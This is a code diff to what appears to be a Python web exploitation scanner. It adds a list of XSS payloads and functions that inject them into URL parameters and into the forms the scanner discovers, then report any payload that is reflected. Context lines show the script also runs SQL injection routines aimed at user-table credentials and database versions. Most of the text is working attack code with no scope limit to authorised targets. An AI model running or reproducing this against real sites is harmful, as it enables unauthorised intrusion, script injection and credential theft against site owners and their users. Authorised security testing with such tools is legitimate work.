@@ -4,10 +4,21 @@ import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 import time
 import random, re
-from urllib.parse import urlparse
+from urllib.parse import urlparse, urljoin
 from requests.exceptions import SSLError, ConnectionError
 
 proxies = {'http': 'http://127.0.0.1:8081', 'https': 'http://127.0.0.1:8081'}
+
+xss_payloads = [
+    "<script>alert('XSS')</script>",
+    "javascript:alert('XSS')",
+    "';alert('XSS');//",
+    "<img src=x onerror=alert('XSS')>",
+    "<svg/onload=alert('XSS')>",
+    "'<script>alert('XSS')</script>'",
+    "\"<script>alert('XSS')</script>\""
+]
+
 
 def get_response(url, retries=3):
     """
@@ -106,6 +117,62 @@ def find_urls_to_test(url, base_url):
         print(f"[+] Found {len(links)} URLs")
     
     return links
+
+def get_forms(response):
+    soup = BeautifulSoup(response.text, 'html.parser')
+    return soup.find_all('form')
+
+
+def exploit_xss(url):
+    for payload in xss_payloads:
+        target_url = f"{url}?input={payload}"
+        try:
+            r = requests.get(target_url, verify=False, proxies=proxies, timeout=10)
+            if payload in r.text:
+                print(f"[+] XSS vulnerability found in URL with payload: {payload}")
+                return True
+        except SSLError as e:
+            print(f"[-] SSL Error on {target_url}: {e}")
+        except requests.RequestException as e:
+            print(f"[-] Request error on {target_url}: {e}")
+    print("[-] No XSS vulnerabilities found in URL.")
+    return False
+
+def submit_xss_payloads_to_forms(url):
+    response = get_response(url)
+    if not response:
+        return False
+
+    soup = BeautifulSoup(response.text, 'html.parser')
+    forms = soup.find_all('form')
+    if not forms:
+        print("[-] No forms found on the page.")
+        return False
+    
+    for form in forms:
+        action = form.get('action')
+        method = form.get('method', 'get').lower()
+        form_url = urljoin(url, action)
+        
+        inputs = form.find_all('input')
+        form_data = {}
+        for input_tag in inputs:
+            input_name = input_tag.get('name')
+            if input_name:
+                form_data[input_name] = random.choice(xss_payloads)
+        
+        for payload in xss_payloads:
+            if method == 'post':
+                r = requests.post(form_url, data=form_data, verify=False, proxies=proxies)
+            else:
+                r = requests.get(form_url, params=form_data, verify=False, proxies=proxies)
+            
+            if payload in r.text:
+                print(f"[+] XSS vulnerability found in form with payload: {payload}")
+                return True
+
+    print("[-] No XSS vulnerabilities found in forms.")
+    return False
 
 def exploit_database_version(url):
     # Definimos tipos de base de datos y payloads adicionales para incrementar persistencia
@@ -401,6 +468,9 @@ if __name__ == "__main__":
             # After testing general vulnerabilities, test for user table credentials
             exploit_sqli_users_table(test_url)
             exploit_database_version(test_url)
+            
+            exploit_xss(test_url)
+            submit_xss_payloads_to_forms(test_url)
             
     else:
         print("[-] No URLs with parameters found.")
